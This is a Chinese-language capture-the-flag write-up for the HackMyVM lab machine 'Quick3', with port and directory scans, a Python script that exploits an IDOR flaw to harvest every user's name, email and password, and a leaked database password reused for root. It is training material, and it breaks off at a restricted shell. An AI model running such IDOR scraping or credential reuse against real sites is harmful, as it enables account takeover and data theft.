---
sidebar_position: 10
tags: [Easy, Linux, IDOR, 密码破解-账号, 密码重用]
title: Quick3
description: Quick3
---
# Quick3
## 端口扫描
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# nmap -sTCV -p- --min-rate 1000 192.168.0.102
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-17 06:21 EDT
Nmap scan report for espo.hmv (192.168.0.102)
Host is up (0.022s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 2e:7a:1f:17:57:44:6f:7f:f9:ce:ab:a1:4f:cd:c7:19 (ECDSA)
|_  256 93:7e:d6:c9:03:5b:a1:ee:1d:54:d0:f0:27:0f:13:eb (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Quick Automative - Home
|_http-server-header: Apache/2.4.52 (Ubuntu)
MAC Address: 08:00:27:28:12:35 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
```
## HTTP - 80
```bash
┌──(root㉿kali)-[~/CTF/HackerMyVM]
└─# gobuster dir -u http://192.168.0.102/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,php,html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.0.102/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/img                  (Status: 301) [Size: 312] [--> http://192.168.0.102/img/]
/images               (Status: 301) [Size: 315] [--> http://192.168.0.102/images/]
/index.html           (Status: 200) [Size: 51414]
/modules              (Status: 301) [Size: 316] [--> http://192.168.0.102/modules/]
/css                  (Status: 301) [Size: 312] [--> http://192.168.0.102/css/]
/lib                  (Status: 301) [Size: 312] [--> http://192.168.0.102/lib/]
/js                   (Status: 301) [Size: 311] [--> http://192.168.0.102/js/]
/customer             (Status: 301) [Size: 317] [--> http://192.168.0.102/customer/]
/404.html             (Status: 200) [Size: 5013]
/fonts                (Status: 301) [Size: 314] [--> http://192.168.0.102/fonts/]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```
进行扫描之后开始访问, 发现在 `customer` 是一个登陆窗口可以进行注册, 在注册之后可以进行访问操作, 同时在查看用户的资料界面可以看到用户的名称、邮箱、密码这些内容, 同时我发现其存在 IDOR 漏洞
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417192307.png)
随后编写脚本来批量获取内容, 从而获取到所有的账号密码
```python
import requests
from bs4 import BeautifulSoup

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Cache-Control': 'no-cache',
    'Cookie': 'PHPSESSID=sqcaqeuhr6iuh5if6qu93fuj9f',
    'Pragma': 'no-cache',
    'Proxy-Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.85 Safari/537.36',
}

def request():
    for i in range(1, 30):
        url = "http://192.168.0.102/customer/user.php?id=" + str(i)
        response = requests.get(url, headers=headers, verify=False).text
        soup = BeautifulSoup(response, 'html.parser')
        name_email = soup.find(class_="contact_inner")
        name = name_email.find("h3").text
        email = name_email.find("ul").findChild("li").text.replace(" : ", "")
        password = soup.find(id="passwordForm").find('input', {'name': 'oldpassword'})["value"]
        print("name: " + name + "\temail: " + email + "\tpassword: " + password)

if __name__ == '__main__':
    request()
```
在获取到密码之后随后进行暴力破解就可以获取到其中一个账号
![](https://raw.githubusercontent.com/JTZ-a/Image/main/img/20240417192422.png)
## 后渗透
### mike --> root
在登陆之后, 前往网站管理目录可以看到数据库的配置文件这里存在密码重用的问题
```bash
mike@quick3:~$ cat /var/www/html/customer/config.php
<?php
// config.php
$conn = new mysqli('localhost', 'root', 'fastandquicktobefaster', 'quick');

// Check connection
if ($conn->connect_error) {
        die("Connection failed: " . $conn->connect_error);
}
?>
```
> 同时可以看到这里存在一些限制不能使用 cd 操作